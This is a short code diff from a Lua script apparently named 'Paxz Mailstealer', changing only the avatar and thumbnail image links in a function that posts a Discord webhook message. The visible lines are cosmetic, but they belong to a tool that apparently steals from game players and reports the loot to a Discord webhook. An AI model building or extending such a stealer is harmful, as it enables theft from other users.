@@ -31,7 +31,7 @@ local webhookcolor = "13369599"
 
 local function sendwebhook(msg)
 local msg = {
-	["avatar_url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=4096",
+	["avatar_url"] = "https://cdn.discordapp.com/attachments/1117107901325115493/1120056544558596147/Paxz.gif",
 	["content"]= "**Paxz Better**",
 	["username"] = "Paxz Mailstealer",
 	["embeds"]= {
@@ -41,7 +41,7 @@ local msg = {
 		["url"]= "https://discord.gg/arkhalis",
 		["color"]= ""..webhookcolor.."",
 		["thumbnail"] = {
-        ["url"] = "https://cdn.discordapp.com/icons/1085872367831613471/a_55aaf60df3ca5b6ba8c7fc5401f3a1ba.gif?size=4096",
+        ["url"] = "https://cdn.discordapp.com/attachments/1117107901325115493/1120056544558596147/Paxz.gif",
         ["height"] = 420,
         ["width"] = 420
         },
